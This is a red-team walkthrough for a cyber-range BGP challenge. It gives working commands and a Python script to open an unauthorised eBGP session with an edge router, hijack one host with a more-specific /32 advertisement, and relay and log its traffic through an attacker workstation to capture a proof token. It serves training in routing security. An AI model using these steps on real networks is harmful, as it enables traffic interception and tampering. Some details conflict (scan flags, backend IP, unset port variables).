**RED TEAM MANUAL**

**Unexpected Route Preference**

**Manual Rogue BGP Peer and More-Specific Prefix Hijack**

Participant starting point: Assigned Kali Linux workstation

Target credentials: None

Attack type: BGP control-plane trust abuse and traffic-path interception

|                            |                                       |
|----------------------------|---------------------------------------|
| **Current target**         | 203.0.0.251                           |
| **Edge router ASN**        | Discovered from the BGP OPEN exchange |
| **Kali WireGuard address** | 10.200.0.5                            |
| **Protected VIP**          | 10.131.205.50                         |
| **Protected public port**  | 19040/tcp                             |
| **Backend relay port**     | 19041/tcp                             |

**Version 1.0 - Live Lab Attack Guide**

*Prepared for a controlled, authorised cyber-range environment*

# **1. Purpose and Scope**

This manual explains the full Red Team attack path for the Unexpected Route Preference challenge. Every phase states which tool is used, why it is needed, what the attack action changes, what should happen immediately afterwards, and how the participant confirms that the phase succeeded.

The participant operates only from the assigned Kali Linux workstation. The participant does not log in to the Ubuntu challenge host, the VyOS router, the approved BGP peer, or the protected backend. Creator-side service-availability checks are separate from the participant attack.

|  |
|----|
| **Authorisation boundary:** Use these steps only inside the assigned cyber-range challenge. The commands establish a live BGP session and manipulate routing state. |

## **1.1 Success criteria**

- Establish an unauthorised external BGP session from Kali to the exposed VyOS edge.

- Learn the legitimate protected aggregate advertised through the edge.

- Advertise a more-specific /32 route for the protected service VIP.

- Move protected traffic through a Kali relay without intentionally taking the backend offline.

- Observe and extract the rotating X-Route-Proof value from live relayed traffic.

## **1.2 What the participant is not doing**

- No SSH access to Ubuntu or VyOS.

- No use of the creator-side attack.sh automation.

- No application credential attack.

- No destructive denial-of-service objective.

- No reading a proof from the target filesystem or environment.

# **2. Challenge Storyline**

A protected service remains reachable, but the network operations team has observed unexpected route preference changes. The participant is asked to investigate the externally reachable routing surface and prove whether an unapproved network can become the preferred path to a single protected host.

The legitimate environment already has an approved BGP peer advertising the protected aggregate 10.131.205.0/24. The protected service uses 10.131.205.50. The attacker attempts to become an unauthorised BGP peer and advertise 10.131.205.50/32. Because a /32 is more specific than a /24, the router should prefer the attacker route for that one host.

**Traffic-path objective**

> NORMAL PATH\
> Synthetic client -\> VyOS -\> approved BGP peer -\> protected service\
> \
> ATTACKED PATH\
> Synthetic client -\> VyOS -\> attacker /32 -\> Kali relay -\> legitimate backend

## **2.1 Why the application must remain available**

A successful route hijack is more meaningful when the attacker can remain in the path while the application still responds. Therefore, Kali runs a transparent relay. The relay receives traffic redirected by the malicious route and forwards it to the legitimate backend. This demonstrates loss of traffic confidentiality and integrity without relying on a simple outage.

# **3. Attack Chain at a Glance**

| **Phase** | **Tool** | **Attacker action** | **Immediate result** | **Security meaning** |
|----|----|----|----|----|
| Reconnaissance | ip, Nmap, Python, cURL | Confirm route, find BGP/HTTP endpoints and discover the edge ASN | Attack surface and protected identity discovered | No compromise yet |
| Rogue peering | BIRD | Open unauthorised eBGP session | VyOS accepts attacker as a neighbour | Control-plane trust failure |
| Route learning | birdc | Inspect legitimate /24 | Attacker learns protected aggregate | Target selection |
| Relay preparation | Socat | Listen on Kali and forward to backend | Kali can preserve service availability | Data-path preparation |
| Prefix hijack | BIRD | Advertise protected /32 | More-specific route becomes preferred | Path control obtained |
| Proof capture | Socat log, grep | Observe X-Route-Proof in transit | Dynamic proof recovered | Traffic interception proven |

# **4. Participant Prerequisites and Known Information**

The platform provides only the current target IP. The participant discovers the Kali WireGuard address, exposed service ports, protected service identity, edge-router ASN and legitimate protected aggregate through normal reconnaissance and live BGP protocol inspection. The Edge ASN is not supplied as operational information.

|  |  |  |
|----|----|----|
| **Item** | **Current value** | **How it is obtained** |
| Target IP | 203.0.0.251 | Provided by the platform |
| Edge ASN | Unknown | Discovered from the edge router BGP OPEN message |
| Kali IP | 10.200.0.5 | Discovered from wg0 |
| Protected public port | 19040 | Discovered with Nmap/cURL |
| Backend public port | 19041 | Discovered with Nmap/cURL |
| Protected VIP | 10.131.205.50 | Disclosed by the protected health endpoint |
| Legitimate aggregate | 10.131.205.0/24 | Learned from the BGP session |
| **Current lab prerequisite:** The challenge infrastructure must translate the malicious data path to the real Kali WireGuard address. If an operator-side status check later reports REDIRECT_TARGET=172.24.4.1:19040 instead of 10.200.0.5:19040, the control-plane attack succeeded but the transparent relay path is being sent to the upstream SNAT gateway. That is a creator-side mapping issue, not a participant error. |  |  |

# **5. Initialise the Current Lab Values**

Run this block once on Kali. Variables reduce typing errors and make later commands easier to read.

**Run on Kali**

> TARGET="203.0.0.251"\
> KALI_INTERFACE="wg0"\
> ATTACKER_ASN="65250"\
> \
> KALI_IP="\$(\
> ip -4 -o address show dev "\$KALI_INTERFACE" \|\
> awk 'NR==1 {split(\$4,a,"/"); print a\[1\]}'\
> )"\
> \
> echo "TARGET=\$TARGET"\
> echo "KALI_IP=\$KALI_IP"\
> echo "ATTACKER_ASN=\$ATTACKER_ASN"

<img src="https://raw.githubusercontent.com/hacktify-uv/temp/main/Vyos-Unexpected-Route-Preference-Red-Team/media/image7.png" style="width:5.85417in;height:4.23958in" />

Expected confirmation: TARGET matches the platform-assigned address and KALI_IP is the IPv4 address assigned to wg0. EDGE_ASN is intentionally not set yet.

# **Step 1 - Confirm the authorised route to the target**


**Tool used**


ip route


**Immediate objective**


Verify that target traffic leaves Kali through the assigned WireGuard interface.


**Run on Kali**

> ip route get "\$TARGET"

**Why this step is required:** The participant should confirm that the target is reached through the authorised challenge VPN rather than another interface.

**What the attack action does:** This command is reconnaissance only. It asks the Linux kernel which interface, source address and next hop would be used for the target.

**What happens after this step:** No traffic-path manipulation occurs. The participant confirms that later BGP and HTTP traffic will use wg0 with source address 10.200.0.5.

**Expected confirmation:** Output containing dev wg0 and src 10.200.0.5.

# **Step 2 - Discover the exposed network services**


**Tool used**


Nmap


**Immediate objective**


Identify the BGP listener and the protected/backend HTTP endpoints.


Nmap is a network reconnaissance tool. A TCP connect scan is appropriate because the challenge is reached through a routed VPN path and the participant does not need raw SYN privileges for the logic of this test.

**Run on Kali**

> sudo nmap -n -Pn -sS --open \\
>
> --min-rate 2000 \\
>
> --max-retries 1 \\
>
> --host-timeout 2m \\
>
> -p 10000-65535 \\
>
> "\$TARGET"
>
> Note: The protected and backend HTTP ports may change between deployments and must be taken from the live scan output.

<img src="https://raw.githubusercontent.com/hacktify-uv/temp/main/Vyos-Unexpected-Route-Preference-Red-Team/media/image4.png" style="width:7in;height:3.97222in" />

- -n prevents DNS lookups so the scan remains fast and output stays IP-focused.

- -Pn skips host discovery and scans the assigned target directly.

- -sT completes normal TCP connections.

- --open displays only reachable ports.

**Why this step is required:** The storyline points to unexpected route preference, but the participant still needs to identify which routing protocol is externally exposed.

**What the attack action does:** The scan sends TCP connection attempts. TCP/179 identifies BGP. The two high HTTP ports identify the protected service front door and the legitimate backend relay.

**What happens after this step:** The participant now has evidence that BGP is reachable from Kali. No BGP neighbour relationship has been created yet.

Expected confirmation: TCP/179 and two high-numbered HTTP service ports are open on the current target.

# Step 3 - Discover the edge router ASN from the BGP OPEN message


Tool used

Python 3 and the BGP protocol
Immediate objective

Send a valid BGP OPEN message and parse the edge router ASN from its reply.


TCP/179 only proves that BGP is exposed. The attacker still needs the remote ASN before BIRD can define the neighbour. A BGP OPEN message contains the sender ASN, so the participant can discover it directly from the protocol exchange without target credentials or access to the router.

Run on Kali

> cat \>/tmp/discover_bgp_asn.py \<\<'PY'\
> \#!/usr/bin/env python3\
> import socket, struct, sys\
> \
> def recv_exact(sock, size):\
> data = b""\
> while len(data) \< size:\
> chunk = sock.recv(size - len(data))\
> if not chunk:\
> raise ConnectionError("BGP peer closed the connection")\
> data += chunk\
> return data\
> \
> def as4_capability(params):\
> offset = 0\
> while offset + 2 \<= len(params):\
> ptype, plen = params\[offset\], params\[offset + 1\]\
> value = params\[offset + 2:offset + 2 + plen\]\
> offset += 2 + plen\
> if ptype != 2:\
> continue\
> cap = 0\
> while cap + 2 \<= len(value):\
> code, length = value\[cap\], value\[cap + 1\]\
> cvalue = value\[cap + 2:cap + 2 + length\]\
> cap += 2 + length\
> if code == 65 and length == 4:\
> return struct.unpack("!I", cvalue)\[0\]\
> return None\
> \
> target, source_ip = sys.argv\[1\], sys.argv\[2\]\
> attacker_asn = 65250\
> body = struct.pack("!BHH4sB", 4, attacker_asn, 90,\
> socket.inet_aton(source_ip), 0)\
> message = b"\xff" \* 16 + struct.pack("!HB", 19 + len(body), 1) + body\
> \
> with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:\
> sock.settimeout(10)\
> sock.bind((source_ip, 0))\
> sock.connect((target, 179))\
> sock.sendall(message)\
> while True:\
> header = recv_exact(sock, 19)\
> length, msg_type = struct.unpack("!HB", header\[16:19\])\
> payload = recv_exact(sock, length - 19)\
> if msg_type == 3:\
> raise RuntimeError("BGP NOTIFICATION received")\
> if msg_type != 1:\
> continue\
> version, asn16, hold, router_id, opt_len = struct.unpack(\
> "!BHH4sB", payload\[:10\])\
> asn32 = as4_capability(payload\[10:10 + opt_len\])\
> edge_asn = asn32 if asn16 == 23456 and asn32 else asn16\
> print(f"EDGE_ASN={edge_asn}")\
> print(f"EDGE_ROUTER_ID={socket.inet_ntoa(router_id)}")\
> print(f"EDGE_HOLD_TIME={hold}")\
> break\
> PY\
> \
> chmod +x /tmp/discover_bgp_asn.py\
> sudo python3 /tmp/discover_bgp_asn.py "\$TARGET" "\$KALI_IP

<img src="https://raw.githubusercontent.com/hacktify-uv/temp/main/Vyos-Unexpected-Route-Preference-Red-Team/media/image10.png" style="width:6.38542in;height:3.19792in" />

Load the discovered value into the current shell

> EDGE_ASN="\$(\
> sudo python3 /tmp/discover_bgp_asn.py "\$TARGET" "\$KALI_IP" \|\
> sed -n 's/^EDGE_ASN=//p'\
> )"\
> \
> test -n "\$EDGE_ASN" \|\| { echo "EDGE ASN discovery failed" \>&2; exit 1; }\
> echo "EDGE_ASN=\$EDGE_ASN"

<img src="https://raw.githubusercontent.com/hacktify-uv/temp/main/Vyos-Unexpected-Route-Preference-Red-Team/media/image5.png" style="width:7in;height:1.86111in" />

Why this step is required: BIRD requires the remote ASN in its neighbour statement, but the challenge intentionally does not provide that value.

What the attack action does: Kali opens TCP/179, sends a standards-compliant BGP OPEN using attacker ASN 65250, receives the edge OPEN reply and extracts the two-octet ASN or four-octet ASN capability.

What happens after this step: The participant has the live EDGE_ASN value needed for the import-only BIRD configuration. No route has been advertised and no traffic path has changed.

Expected confirmation: The script prints EDGE_ASN=\<numeric-ASN\>. The value is then stored in the EDGE_ASN shell variable.

# Step 4 - Identify the protected service and backend


**Tool used**


cURL


**Immediate objective**


Query the discovered HTTP endpoints and learn which internal identity each endpoint represents.


cURL is an HTTP client. It is used here for service discovery, not for a web exploit.

**Run on Kali**

> curl -sS --max-time 5 "http://\${TARGET}:\${PROTECTED_PORT}/health"\
> \
> echo\
> \
> curl -sS --max-time 5 "http://\${TARGET}:\${BACKEND_PORT}/health"
>
> <img src="https://raw.githubusercontent.com/hacktify-uv/temp/main/Vyos-Unexpected-Route-Preference-Red-Team/media/image1.png" style="width:6.89583in;height:3.14583in" />

**Why this step is required:** The attacker needs to know which internal host must be targeted and which public endpoint still reaches the legitimate backend.

**What the attack action does:** The first request identifies the protected virtual IP. The second identifies the backend node used later by the transparent relay.

**What happens after this step:** The attacker learns that 10.131.205.50 is the protected host and that target port 19041 can carry relayed traffic to the legitimate backend.

**Expected confirmation:** Protected response shows IDENTITY=protected-vip and ADDRESS=10.131.205.50. Backend response shows IDENTITY=backend-node and ADDRESS=10.131.205.51.

# Step 5 - Install the routing and relay tools


**Tool used**


APT, BIRD, Socat and Tcpdump


**Immediate objective**


Prepare Kali to act as a BGP router, traffic relay and evidence collector.


**Run on Kali**

> sudo apt-get update\
> sudo apt-get install -y bird2 socat tcpdump

### **Tool explanation**

| **Tool** | **Why it is used** | **What it does in this attack** |
|----|----|----|
| BIRD | A normal Linux route command cannot send BGP advertisements. | Runs a real BGP speaker on Kali, exchanges OPEN/KEEPALIVE/UPDATE messages and advertises the malicious /32. |
| birdc | The running BIRD process needs a control and inspection interface. | Shows neighbour state, imported routes and exported routes; reloads the BIRD configuration. |
| Socat | Hijacked traffic must continue to the legitimate backend. | Listens on Kali and creates a bidirectional TCP relay to target port 19041. |
| Tcpdump | The participant should preserve protocol evidence. | Captures BGP traffic and can confirm HTTP traffic reaches Kali. |

**Why this step is required:** Kali must behave like a router rather than merely modify its own local route table.

**What the attack action does:** Installing the tools does not attack the target. It equips the workstation with a real BGP daemon, control client, relay and packet capture utility.

**What happens after this step:** The workstation is ready, but no unauthorised session or malicious route exists yet.

# Step 6 - Create a safe import-only BIRD configuration


**Tool used**


BIRD configuration language


**Immediate objective**


Attempt unauthorised peering without advertising a route yet.


The initial configuration uses export none. This separates the trust-control failure from the actual route hijack. First, the participant proves that VyOS accepts the unauthorised peer. Only later is the malicious /32 exported.

**Run on Kali**

> cat \>/tmp/vyos-red.conf \<\<EOF\
> log "/tmp/vyos-red-bird.log" all;\
> \
> router id \${KALI_IP};\
> \
> protocol device {\
> }\
> \
> protocol bgp vyos {\
> local as \${ATTACKER_ASN};\
> neighbor \${TARGET} as \${EDGE_ASN};\
> source address \${KALI_IP};\
> multihop 8;\
> \
> ipv4 {\
> import all;\
> export none;\
> };\
> }\
> EOF\
> \
> sudo bird -p -c /tmp/vyos-red.conf

### <img src="https://raw.githubusercontent.com/hacktify-uv/temp/main/Vyos-Unexpected-Route-Preference-Red-Team/media/image2.png" style="width:6.35417in;height:4.70833in" />

### **Important BIRD statements**

> **router id \${KALI_IP} -** Uses the Kali WireGuard address as the BGP identifier.
>
> **local as \${ATTACKER_ASN} -** Places Kali in private ASN 65250.
>
> neighbor \${TARGET} as \${EDGE_ASN} - Defines the public challenge endpoint and the edge ASN discovered from the BGP OPEN reply.
>
> **source address \${KALI_IP} -** Ensures the session originates from the VPN address.
>
> **multihop 8 -** Allows the eBGP session to traverse the Ubuntu/OpenStack translation path.
>
> **import all -** Accepts routes advertised by VyOS so the attacker can inspect the protected aggregate.
>
> **export none -** Prevents an accidental route advertisement during the initial neighbour test.

**Why this step is required:** A staged configuration makes it clear whether the vulnerability is unauthorised peer acceptance or route preference manipulation.

**What the attack action does:** The configuration describes a real external BGP neighbour but deliberately suppresses route export.

**What happens after this step:** After validation, the configuration is syntactically ready. The attack has still not started because BIRD is not running.

**Expected confirmation:** The validation command returns without an error message.

# Step 7 - Start BIRD and establish the unauthorised BGP session


**Tool used**


BIRD daemon and birdc


**Immediate objective**


Turn Kali into a live rogue BGP peer.


**Run on Kali**

> sudo birdc -s /tmp/vyos-red.ctl down 2\>/dev/null \|\| true\
> sudo pkill -F /tmp/vyos-red.pid 2\>/dev/null \|\| true\
> sudo rm -f /tmp/vyos-red.ctl /tmp/vyos-red.pid\
> \
> sudo bird -c /tmp/vyos-red.conf -s /tmp/vyos-red.ctl -P /tmp/vyos-red.pid\
> \
> sleep 5\
> \
> sudo birdc -s /tmp/vyos-red.ctl show protocols all vyos

<img src="https://raw.githubusercontent.com/hacktify-uv/temp/main/Vyos-Unexpected-Route-Preference-Red-Team/media/image6.png" style="width:7in;height:4.38889in" />

BIRD sends a BGP OPEN containing the attacker ASN and router ID. VyOS replies with its own OPEN. The peers negotiate capabilities, exchange KEEPALIVE messages and transition to Established if the vulnerable dynamic-neighbour policy accepts Kali.

**Why this step is required:** This phase tests whether the exposed edge accepts an unapproved external router without credentials or BGP authentication.

**What the attack action does:** Kali becomes a live BGP neighbour. This is already a control-plane trust compromise, but export none means no protected traffic should move yet.

**What happens after this step:** The session should show Established, one route may be imported, and zero routes should be exported. The protected application should remain on the approved path.

Expected confirmation: BGP state: Established; Neighbor AS: the discovered EDGE_ASN; Local AS: 65250; Output filter: REJECT or export none; zero exported routes.

|  |
|----|
| **Operator validation checkpoint:** At this phase, the creator-side service-availability TTP should normally report APP:PASS, UNAUTHORIZED_BGP:1, PATH_CHANGED:0 and ATTACK:NOT_DETECTED. A rogue session is suspicious, but traffic-path control has not yet been demonstrated. |

# Step 8 - Inspect the legitimate route learned from VyOS


**Tool used**


birdc


**Immediate objective**


Discover the approved protected aggregate before selecting a more-specific host route.


**Run on Kali**

> sudo birdc -s /tmp/vyos-red.ctl show route protocol vyos all

<img src="https://raw.githubusercontent.com/hacktify-uv/temp/main/Vyos-Unexpected-Route-Preference-Red-Team/media/image9.png" style="width:7in;height:1.83333in" />

The route can appear as unreachable on Kali because its BGP next hop is internal to the challenge topology. That does not block the attack. The participant only needs the route information so that a more-specific prefix can be selected.

**Why this step is required:** The participant should avoid guessing the protected aggregate. BGP route inspection provides the network directly from the edge.

**What the attack action does:** birdc asks the running BIRD daemon to display routes imported through the vyos protocol.

**What happens after this step:** The participant learns 10.131.205.0/24. Combined with the earlier protected VIP 10.131.205.50, this reveals that a 10.131.205.50/32 advertisement would be more specific.

**Expected confirmation:** A route for 10.131.205.0/24, with a BGP AS path containing the edge and approved peer ASNs.

# Step 9 - Begin BGP packet capture


**Tool used**


Tcpdump


**Immediate objective**


Preserve network-level evidence of the real BGP session and UPDATE messages.


**Run on Kali**

> sudo rm -f /tmp/vyos-red-bgp.pcap /tmp/vyos-red-tcpdump.log\
> \
> sudo tcpdump -U -ni "\$KALI_INTERFACE" -w /tmp/vyos-red-bgp.pcap host "\$TARGET" and tcp port 179 \>/tmp/vyos-red-tcpdump.log 2\>&1 &\
> \
> TCPDUMP_PID=\$!\
> echo "TCPDUMP_PID=\$TCPDUMP_PID"
>
> <img src="https://raw.githubusercontent.com/hacktify-uv/temp/main/Vyos-Unexpected-Route-Preference-Red-Team/media/image3.png" style="width:7in;height:1.01389in" />

**Why this step is required:** A challenge writeup should retain evidence that the route exchange occurred over real BGP.

**What the attack action does:** Tcpdump records the existing BGP session and the malicious UPDATE that will be sent later. It does not modify the session.

**What happens after this step:** A PCAP is created in the background. Routing and application behaviour remain unchanged.

**Expected confirmation:** A background tcpdump PID and a growing /tmp/vyos-red-bgp.pcap file.

# Step 10 - Prepare the transparent relay before hijacking traffic


**Tool used**


Socat


**Immediate objective**


Ensure that redirected traffic can still reach the legitimate backend.


**Run on Kali**

> sudo pkill -f 'socat.\*TCP-LISTEN:19040' 2\>/dev/null \|\| true\
> sudo rm -f /tmp/vyos-kali-relay.log\
> \
> sudo nohup socat -v TCP-LISTEN:\${PROTECTED_PORT},bind=\${KALI_IP},reuseaddr,fork TCP:\${TARGET}:\${BACKEND_PORT} \>/dev/null 2\>/tmp/vyos-kali-relay.log &\
> \
> RELAY_PID=\$!\
> echo "RELAY_PID=\$RELAY_PID"\
> \
> sudo ss -lntp \| grep ":\${PROTECTED_PORT} "

### <img src="https://raw.githubusercontent.com/hacktify-uv/temp/main/Vyos-Unexpected-Route-Preference-Red-Team/media/image12.png" style="width:7in;height:1.34722in" />

### **How Socat works here**

- TCP-LISTEN:19040 opens the relay port on Kali.

- bind=10.200.0.5 binds the listener to the WireGuard address used by the challenge.

- reuseaddr allows quick restart after a test.

- fork handles each incoming connection in a child process.

- TCP:203.0.0.96:19041 forwards the connection to the legitimate backend relay.

- -v writes transferred application data to /tmp/vyos-kali-relay.log.

**Why this step is required:** A route hijack without a relay would normally blackhole the service. The challenge objective is controlled interception while preserving application availability.

**What the attack action does:** Kali begins listening for redirected protected-service traffic and is ready to pass it to the real backend.

**What happens after this step:** No protected traffic should arrive yet because the malicious /32 has not been advertised. The listener should simply remain open.

**Expected confirmation:** ss shows a socat listener on 10.200.0.5:19040.

# Step 11 - Install the protected /32 locally on Kali


**Tool used**


ip address


**Immediate objective**


Create a local route that BIRD can originate through the direct protocol.


**Run on Kali**

> sudo ip address add "\${PROTECTED_VIP}/32" dev lo 2\>/dev/null \|\| true\
> \
> ip -4 address show dev lo \| grep "\$PROTECTED_VIP"

<img src="https://raw.githubusercontent.com/hacktify-uv/temp/main/Vyos-Unexpected-Route-Preference-Red-Team/media/image8.png" style="width:7in;height:1.51389in" />

The Linux ip command changes local interface addressing. It does not speak BGP. Adding the /32 to loopback only makes the host route available to BIRD as a locally connected prefix.

**Why this step is required:** BIRD needs a route source before it can advertise the protected /32.

**What the attack action does:** Kali claims the protected VIP locally on loopback. This is preparation for route origination, not yet a network-wide advertisement.

**What happens after this step:** Kali now has a local 10.131.205.50/32 route. VyOS still uses the approved /24 until the BIRD export policy changes.

**Expected confirmation:** inet 10.131.205.50/32 appears on lo.

# Step 12 - Configure and advertise the malicious more-specific route


**Tool used**


BIRD and birdc


**Immediate objective**


Send a real BGP UPDATE for 10.131.205.50/32 while rejecting every other Kali route.


**Run on Kali**

> cat \>/tmp/vyos-red.conf \<\<EOF\
> log "/tmp/vyos-red-bird.log" all;\
> \
> router id \${KALI_IP};\
> \
> protocol device {\
> }\
> \
> protocol direct protected_vip {\
> ipv4;\
> interface "lo";\
> }\
> \
> filter export_hijack {\
> if net = \${PROTECTED_VIP}/32 then accept;\
> reject;\
> }\
> \
> protocol bgp vyos {\
> local as \${ATTACKER_ASN};\
> neighbor \${TARGET} as \${EDGE_ASN};\
> source address \${KALI_IP};\
> multihop 8;\
> \
> ipv4 {\
> import all;\
> export filter export_hijack;\
> };\
> }\
> EOF\
> \
> sudo bird -p -c /tmp/vyos-red.conf\
> sudo birdc -s /tmp/vyos-red.ctl configure\
> sleep 5

<img src="https://raw.githubusercontent.com/hacktify-uv/temp/main/Vyos-Unexpected-Route-Preference-Red-Team/media/image11.png" style="width:7in;height:5.83333in" />

The direct protocol imports the loopback-connected /32 into BIRD. The export_hijack filter permits exactly one prefix and rejects everything else. This prevents accidental advertisement of Kali routes or the VPN network.

**Why this step is required:** The legitimate peer advertises 10.131.205.0/24. The attacker needs a route that wins only for the protected service without replacing the entire aggregate.

**What the attack action does:** BIRD sends a BGP UPDATE advertising 10.131.205.50/32. VyOS accepts it through the vulnerable participant policy.

**What happens after this step:** VyOS now has both the approved /24 and attacker /32. Longest-prefix selection prefers the /32 for 10.131.205.50, so new protected-service connections should move towards the attacker path.

**Expected confirmation:** BIRD reports Reconfigured and the BGP session remains Established.

# Step 13 - Verify the route export and session state


**Tool used**


birdc


**Immediate objective**


Confirm that the malicious /32 is actually being advertised and the peer remains established.


**Run on Kali**

> sudo birdc -s /tmp/vyos-red.ctl show route export vyos all\
> \
> sudo birdc -s /tmp/vyos-red.ctl show protocols all vyos

<img src="https://raw.githubusercontent.com/hacktify-uv/temp/main/Vyos-Unexpected-Route-Preference-Red-Team/media/image13.png" style="width:7in;height:7.31944in" />

**Why this step is required:** A valid local route and a correct BIRD file are not enough; the participant must verify that the UPDATE is present in the outbound route table.

**What the attack action does:** The first command shows prefixes eligible for export to VyOS. The second confirms neighbour state and imported/exported route counts.

**What happens after this step:** The participant should see 10.131.205.50/32 exported, one imported route and one exported route. If the data path is correctly mapped by the challenge, traffic will begin reaching Socat.

**Expected confirmation:** 10.131.205.50/32 appears in show route export vyos all; the vyos protocol remains Established with 1 exported route.

|  |
|----|
| **Operator validation checkpoint:** The expected secure-status transition is SERVICE_STATUS:DOWN with UNAUTHORIZED_BGP:1, PATH_CHANGED:1 and ATTACK:DETECTED. For a fully successful transparent hijack, APP must remain 1 and EXTERNAL_TRANSIT should become 1. If APP becomes 0 and REDIRECT_TARGET is 172.24.4.1:19040, the live BGP attack succeeded but the challenge data-path mapper selected the OpenStack/WireGuard SNAT gateway instead of Kali. |

# Step 14 - Observe protected traffic on the Kali relay


**Tool used**


Socat verbose log and optional Tcpdump


**Immediate objective**


Prove that the malicious route moved live application traffic through Kali.


**Run on Kali**

> sudo tail -f /tmp/vyos-kali-relay.log

When the challenge-side synthetic client generates a new request, Socat should log both directions of the HTTP exchange. The participant should expect request headers, a health nonce and the response containing X-Route-Proof.

**Optional evidence command**

> \# Optional parallel packet view\
> sudo tcpdump -ni "\$KALI_INTERFACE" tcp port "\$PROTECTED_PORT"

**Why this step is required:** A BGP route advertisement proves control-plane manipulation, but the challenge requires proof that application traffic actually traversed the attacker.

**What the attack action does:** The Socat log records bytes relayed through Kali. Seeing the synthetic health request and response demonstrates path interception.

**What happens after this step:** Kali now has visibility into protected traffic while forwarding it to the backend. The application should still respond if the challenge data-path translation is correct.

**Expected confirmation:** HTTP request/response content appears in /tmp/vyos-kali-relay.log, including an X-Route-Proof header.

# Step 15 - Extract the rotating proof


**Tool used**


grep and sed


**Immediate objective**


Recover the raw dynamic answer from traffic observed in transit.


**Run on Kali**

> grep -aEo 'X-Route-Proof:\[\[:space:\]\]\*proof-\[A-Za-z0-9.\_:-\]+' /tmp/vyos-kali-relay.log \|\
> tail -n1 \|\
> sed -E 's/^X-Route-Proof:\[\[:space:\]\]\*//'

grep searches the binary-safe verbose relay log for the proof header. tail selects the latest rotating value. sed removes the HTTP header name and returns only the raw proof required by the platform.

**Why this step is required:** The answer must come from live intercepted traffic rather than from a static file or a creator script.

**What the attack action does:** The pipeline extracts the most recent X-Route-Proof value seen while traffic passed through Kali.

**What happens after this step:** The participant obtains a raw proof-... value and can submit it. Do not wrap it in flag{} or answer{} unless the platform explicitly changes the submission format.

**Expected confirmation:** A single raw value beginning with proof-.

# **6. Expected Service-Availability State after Each Phase**

The following table describes the creator-side service-availability TTP. It is not a participant command, but it helps the challenge developer verify that every stage behaves correctly.

|  |  |  |  |  |  |  |
|----|----|----|----|----|----|----|
| **Phase** | **APP** | **Unauthorised BGP** | **Path changed** | **External transit** | **Attack** | **Service state** |
| Clean baseline | 1 | 0 | 0 | 0 | Not detected | UP |
| Rogue session, export none | 1 | 1 | 0 | 0 | Not detected | UP |
| Malicious /32, broken relay | 0 | 1 | 1 | 0 | Detected | DOWN |
| Malicious /32, working relay | 1 | 1 | 1 | 1 | Detected | DOWN |
| After cleanup/reset | 1 | 0 | 0 | 0 | Not detected | UP |
| **Meaning of DOWN:** In the successful attack state, DOWN represents a security compromise, not necessarily an HTTP outage. APP:1 with ATTACK:DETECTED is the intended transparent-interception result. |  |  |  |  |  |  |

# **7. Troubleshooting Guide**

|  |  |  |
|----|----|----|
| **Observed result** | **Likely meaning** | **Participant action** |
| BGP remains Active/Connect | Target, ASN, source address, reachability or multihop setting is wrong. | Verify TARGET, EDGE_ASN, KALI_IP, TCP/179 and multihop 8. |
| Established, 0 imported routes | The edge session is up but route advertisement has not arrived or import policy is wrong. | Wait, inspect BIRD log, verify import all. |
| No /32 in export table | Loopback VIP missing or export filter does not match. | Check ip address show lo and validate the exact /32 in export_hijack. |
| Session drops after reconfigure | Syntax or neighbour parameters changed. | Run bird -p first, inspect /tmp/vyos-red-bird.log, restore tested neighbour values. |
| Socat listener exists but log is empty | The malicious path is not reaching Kali. | Confirm /32 is exported. Ask the operator to inspect the service TTP redirect target. |
| Status shows redirect target 172.24.4.1:19040 | Challenge mapped the SNAT-visible source instead of the Kali WireGuard IP. | Do not change the Red steps. This is a creator-side data-path mapping issue. |
| APP:0 after /32 advertisement | Traffic was hijacked but not successfully relayed. | Verify Socat, backend reachability and challenge-side redirect mapping. |
| Proof header not found | Traffic has not traversed Socat or the synthetic request has not occurred yet. | Keep the relay running, wait for traffic and inspect the full relay log. |

# **8. Cleanup and Attack Withdrawal**

Preserve evidence before cleanup. Stopping BIRD withdraws the malicious route. Removing the loopback VIP and stopping Socat returns Kali to its normal workstation state.

**Run on Kali**

> sudo birdc -s /tmp/vyos-red.ctl down 2\>/dev/null \|\| true\
> sudo pkill -F /tmp/vyos-red.pid 2\>/dev/null \|\| true\
> sudo pkill -f 'socat.\*TCP-LISTEN:19040' 2\>/dev/null \|\| true\
> sudo ip address del "\${PROTECTED_VIP}/32" dev lo 2\>/dev/null \|\| true\
> sudo kill "\${TCPDUMP_PID:-0}" 2\>/dev/null \|\| true\
> \
> sudo rm -f /tmp/vyos-red.ctl /tmp/vyos-red.pid /tmp/vyos-red.conf

**Why this step is required:** A persistent BIRD process continues advertising until it is stopped. A clean reset is required before validating the baseline again.

**What the attack action does:** BIRD withdraws the attacker route, Socat closes the relay port and the local protected VIP is removed.

**What happens after this step:** VyOS should fall back to the approved 10.131.205.0/24 route. After challenge-side cleanup or reset, the service-availability TTP should return to UP with no unauthorised BGP or path change.

# **9. Tool Reference**

| **Tool** | **Category** | **Core role** | **Key command in this challenge** |
|----|----|----|----|
| Python 3 | Protocol reconnaissance | Send a minimal BGP OPEN and parse the edge OPEN reply to recover the ASN. | python3 /tmp/discover_bgp_asn.py ... |
| ip | Linux networking | Inspect route/interface state and add the protected /32 to loopback. | ip route get; ip address add |
| Nmap | Reconnaissance | Discover TCP/179 and HTTP service ports. | nmap -sT -p ... |
| cURL | HTTP client | Identify the protected VIP/backend and test reachability. | curl http://target:port/health |
| BIRD | Routing daemon | Make Kali speak real BGP and advertise the malicious route. | bird -c ... |
| birdc | BIRD control client | Inspect and reconfigure the running routing daemon. | birdc show protocols/routes; configure |
| Socat | Bidirectional relay | Keep the protected service available while traffic passes through Kali. | socat TCP-LISTEN ... TCP:backend |
| Tcpdump | Packet capture | Preserve BGP and traffic-path evidence. | tcpdump -i wg0 ... |
| grep/sed | Text processing | Extract the rotating proof from relayed HTTP data. | grep X-Route-Proof \| sed ... |

# **10. Technical Impact Summary**

The participant does not compromise an application account or obtain a target shell. Instead, the participant exploits a routing-trust failure: an exposed VyOS dynamic BGP neighbour range accepts an unapproved eBGP peer, and the inbound policy accepts a route more specific than the approved aggregate.

The malicious 10.131.205.50/32 wins over the legitimate 10.131.205.0/24 for the protected host. This changes the selected data path. With a functioning transparent relay, the service remains operational while the attacker observes the rotating proof in transit.

- Control-plane impact: unauthorised BGP neighbour established.

- Routing-table impact: attacker-controlled /32 preferred for the protected VIP.

- Confidentiality impact: protected requests and responses become visible on Kali.

- Integrity impact: an in-path attacker could modify traffic before forwarding it.

- Availability impact: a broken relay causes an outage; a working relay preserves application response while the security state remains DOWN.

|  |
|----|
